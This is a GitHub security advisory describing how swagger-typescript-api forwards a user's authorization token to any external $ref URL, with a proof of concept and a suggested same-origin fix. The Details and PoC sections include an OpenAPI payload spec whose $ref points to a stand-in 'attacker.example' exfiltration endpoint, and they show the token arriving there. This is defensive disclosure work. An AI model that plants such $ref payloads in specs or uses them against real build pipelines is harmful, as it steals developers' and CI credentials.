# [H] swagger-typescript-api vulnerable to authorization-token exfiltration via spec `$ref`

## Summary
Severity: High
Advisory: GHSA-h754-fxp7-88wx
CVE: CVE-2026-54660
CWE: CWE-200, CWE-201, CWE-522, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-h754-fxp7-88wx
Type: github-advisory

## Affected
- npm: `swagger-typescript-api` — affected >=0 <13.12.2

## Details
### Summary

When the developer supplies an `--authorizationToken` (commonly required to fetch a private spec behind authentication), `swagger-typescript-api` attaches that token to the `Authorization` header of **every** subsequent HTTP request it makes while resolving external `$ref` URLs in the spec — with **no same-origin check, no host allowlist, and no scope-down** for cross-origin requests. A malicious OpenAPI spec containing a `$ref` to an attacker-controlled URL therefore causes the developer's bearer token to be sent verbatim to that URL during code generation.

The threat model is identical to the SSRF advisory filed alongside this one (companion finding), but with credential disclosure as the primary impact. The token is typically a high-value secret: a GitHub PAT, an OAuth bearer for the API the spec describes, an enterprise SSO token, an AWS-style API key, or similar. Disclosure to an attacker-controlled URL is one curl-equivalent away from full takeover of whatever scope the token grants.

### Details

The header-builder lives in `src/resolved-swagger-schema.ts:81-92`:

```ts
private getRemoteRequestHeaders(): Record<string, string> {
  return Object.assign(
    {},
    this.config.authorizationToken
      ? {
          Authorization: this.config.authorizationToken,
        }
      : {},
    (this.config.requestOptions?.headers as
      | Record<string, string>
      | undefined) || {},
  );
}
```

There is no check that the request's destination URL shares an origin (or scheme, or host, or even top-level domain) with `this.config.url` — the URL the user originally specified. The headers object is unconditional.

`getRemoteRequestHeaders` is called by `fetchRemoteSchemaDocument` (`src/resolved-swagger-schema.ts:374`):

```ts
const response = await fetch(url, {
  headers: this.getRemoteRequestHeaders(),
});
```

…which is in turn called by `warmUpRemoteSchemasCache` (`src/resolved-swagger-schema.ts:399-445`) for every external `$ref` URL discovered while walking the spec.

Net effect: a spec whose response schema is

```json
{ "$ref": "http://attacker.example/exfil-endpoint/data.json" }
```

causes the generator to send

```
GET /exfil-endpoint/data.json HTTP/1.1
Host: attacker.example
Authorization: <full value of --authorizationToken>
```

to `attacker.example`, regardless of where the original spec was hosted.

The `--authorizationToken` flag is the standard mechanism for consuming a spec behind auth — for example, fetching a private GitHub-hosted spec with a Personal Access Token, fetching a vendor API spec behind an OAuth bearer, fetching a Confluence-hosted spec with a session token. Setting `--authorizationToken` is therefore not an exotic configuration; it is the *intended* configuration for any non-public spec.

### PoC

Self-contained reproducer in comments (install `swagger-typescript-api@13.12.1` into a local `node_modules`, spin up two loopback HTTP servers — one serving the spec, one pretending to be the attacker's exfil endpoint — run the generator with `authorizationToken` set, observe what the attacker endpoint received). Tested on `swagger-typescript-api@13.12.1` and Node `v24.11.1`.

**Payload spec** (served from `http://127.0.0.1:<spec-port>/spec.json`):

```json
{
  "openapi": "3.0.0",
  "info": { "title": "TokenLeak-payload", "version": "1.0.0" },
  "paths": {
    "/p": {
      "get": {
        "operationId": "p",
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "http://127.0.0.1:<attacker-port>/EXFIL_ENDPOINT/data.json"
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Steps:**

```bash
# 1. Start a loopback "attacker" HTTP server on a different port from the spec server.
# 2. Start a loopback "spec" HTTP server that serves the payload spec above.
# 3. Run the generator with --authorizationToken set.
npm install swagger-typescript-api@13.12.1
node -e "import('swagger-typescript-api').then(m => m.generateApi({
  output: '/tmp/out',
  url: 'http://127.0.0.1:<spec-port>/spec.json',
  authorizationToken: 'Bearer USER_GITHUB_PAT_super_secret_xyz123',
  httpClientType: 'fetch'
}))"
```

**Observed:**

```
[control] (no cross-origin $ref) → attacker-server hits: 0
[payload] ($ref → http://attacker)
  attacker-server hits: 1
  hit: /EXFIL_ENDPOINT/data.json  Authorization header: Bearer USER_GITHUB_PAT_super_secret_xyz123
  TOKEN LEAKED — attacker server received user-supplied authorizationToken verbatim
```

The attacker-controlled endpoint received the developer's full `Bearer ...` token verbatim, sent by the generator while resolving the spec's `$ref`.

### Impact

**Type:** Insufficiently Protected Credentials (CWE-522) / Exposure of Sensitive Information to an Unauthorized Actor (CWE-200) / Insertion of Sensitive Information into Sent Data (CWE-201) via missing same-origin check on credentialed HTTP requests.

**Affected use cases:**

- **A developer fetching a private OpenAPI spec behind authentication** (GitHub-hosted private spec, vendor-API spec on an OAuth-protected URL, Atlassian / Confluence / enterprise wiki-hosted spec) and the spec author is not the developer. This is the literal documented usage of `--authorizationToken`.
- **A CI/CD pipeline regenerating clients from a private spec on every build** — the CI's authentication token (often a long-lived service-account credential) leaks on every run.
- **A multi-tenant SaaS that generates per-tenant clients from tenant-supplied specs** — a tenant's malicious spec captures the SaaS provider's API key.
- **Any project where a contributor can modify the pinned spec via PR** — the project's CI credentials leak on first build of the malicious PR.

**Lifecycle:** generation-time. The token leak happens when the developer or CI pipeline runs `swagger-typescript-api generate`, not when the generated client is later imported.

**Privilege of stolen token:** typically the developer's API authentication for the target service — a GitHub PAT (full source-code read/write to whatever repos the PAT scope allows), an OAuth bearer (full impersonation on the API), an AWS-style key (full account access depending on IAM policy), or a CI service-account token (full CI/CD pipeline access). Token capture is functionally equivalent to credential theft — the attacker gains the same scope of access the developer had.

**Suggested fix:**

The minimum sufficient fix is a same-origin check on the `Authorization` header forwarding:

```ts
// in src/resolved-swagger-schema.ts:81-92
private getRemoteRequestHeaders(targetUrl?: string): Record<string, string> {
  const headers: Record<string, string> = {};

  // Only attach Authorization if the target URL shares an origin with the
  // user-supplied spec URL. Otherwise the token is leaked across origins.
  if (
    this.config.authorizationToken &&
    targetUrl &&
    this.isSameOrigin(targetUrl, this.config.url)
  ) {
    headers.Authorization = this.config.authorizationToken;
  }

  return Object.assign(
    headers,
    (this.config.requestOptions?.headers as Record<string, string> | undefined) || {},
  );
}

private isSameOrigin(a: string, b: string | undefined): boolean {
  if (typeof b !== "string") return false;
  try {
    const ua = new URL(a);
    const ub = new URL(b);
    return ua.protocol === ub.protocol && ua.host === ub.host;
  } catch {
    return false;
  }
}
```

Then update the call site `fetchRemoteSchemaDocument` (`src/resolved-swagger-schema.ts:374`) to pass the destination URL:

```ts
const response = await fetch(url, {
  headers: this.getRemoteRequestHeaders(url),
});
```

This is the same model browsers apply to credentialed `fetch` requests by default. It does not break legitimate same-server `$ref`s — those still authenticate normally. It only strips the token when the target's origin differs from the spec source's origin.

For deeper hardening, combine this with the SSRF mitigations recommended in the companion advisory (private-IP filter + custom undici dispatcher with redirect re-validation). The two fixes are complementary: the SSRF guard prevents the request from reaching the attacker at all; the same-origin guard prevents credential leakage even if the request does happen.

Submitted by: Hamza Haroon (thegr1ffyn)

## References
- https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-h754-fxp7-88wx
- https://github.com/acacode/swagger-typescript-api/pull/1779
- https://github.com/acacode/swagger-typescript-api/commit/306d59acb8ffbb00f953f807b97234b21f51d9de
- https://github.com/acacode/swagger-typescript-api
- https://github.com/acacode/swagger-typescript-api/releases/tag/v13.12.2
